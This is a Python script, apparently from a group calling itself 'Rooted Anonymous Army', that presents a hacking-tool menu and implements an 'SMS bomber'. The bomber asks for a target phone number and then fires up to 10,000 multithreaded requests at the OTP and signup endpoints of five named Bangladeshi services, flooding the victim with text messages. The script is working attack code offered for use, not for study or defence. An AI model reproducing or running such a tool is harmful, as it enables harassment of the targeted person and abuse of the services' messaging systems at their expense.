import os, sys, time, requests, random
from concurrent.futures import ThreadPoolExecutor

# --- Color Setup ---
G = '\033[32m'; R = '\033[31m'; Y = '\033[33m'; C = '\033[36m'; W = '\033[0m'

def banner():
    os.system('clear')
    print(f"""{R}
    ____  ___    ___     ____  ____  ___ 
   / __ \/   |  /   |   / __ \/ __ \/   |
  / /_/ / /| | / /| |  / /_/ / /_/ / /| |
 / _, _/ ___ |/ ___ | / _, _/ _, _/ ___ |
/_/ |_/_/  |_/_/  |_|/_/ |_/_/ |_/_/  |_|
{C}================================================
{G} [+] FOUNDER : {W}Sabid Sarker
{G} [+] CEO     : {W}Ashish Shom
{G} [+] TEAM    : {R}Rooted Anonymous Army (RAA)
{G} [+] VERSION : {Y}God-Mode v16.0 (International)
{C}================================================{W}""")

def mega_bomber():
    print(f"\n{C}--- RAA MEGA BOMBER ENGINE ---{W}")
    target = input(f"{G}[+] Target Number (e.g., 017xxx): {W}") #
    try:
        limit = int(input(f"{G}[+] SMS Limit (Max 10k): {W}")) #
    except ValueError:
        print(f"{R}[!] Invalid Limit!{W}"); return

    def fire(i):
        try:
            # API 1: Bikroy (GET)
            requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phones/{target}", timeout=5) #
            
            # API 2: Shajgoj (POST)
            requests.post("https://web.shajgoj.com/api/v2/auth/otp/send", data={"mobile": target}, timeout=5) #
            
            # API 3: Osudpotro (GET)
            requests.get(f"https://www.osudpotro.com/api/v1/users/send-otp?phone={target}", timeout=5) #
            
            # API 4: Redx (POST)
            requests.post("https://api.redx.com.bd/v1/user/signup", json={"phone": target}, timeout=5)
            
            # API 5: IDLC (POST)
            requests.post("https://idlc.com/api/v1/send-otp", data={"mobile": target}, timeout=5)
            
            print(f"\r{G}[✔] ATTACK SENT SUCCESSFULLY: {i+1}", end="") #
        except:
            pass

    print(f"{Y}[*] Status: Launching Multithreaded Attack...{W}") #
    with ThreadPoolExecutor(max_workers=50) as executor: #
        for i in range(limit):
            executor.submit(fire, i)
    input(f"\n\n{G}[+] Task Finished! Press Enter to go back.{W}") #

def main():
    while True:
        banner()
        print(f" {C}[01]{W} Facebook Recon     {C}[04]{W} IP Tracker Pro") #
        print(f" {C}[02]{W} Mega SMS Bomber   {C}[05]{W} Proxy Updater") #
        print(f" {C}[03]{W} Port Scanner      {C}[00]{W} Exit System") #
        
        choice = input(f"\n{C}[RAA-Shell]:~# {W}") #
        if choice in ['2', '02']: #
            mega_bomber()
        elif choice in ['0', '00']: 
            print(f"{R}[!] Exiting...{W}")
            sys.exit()
        else:
            print(f"{R}[!] Invalid Option!{W}")
            time.sleep(1)

if __name__ == "__main__":
    main()

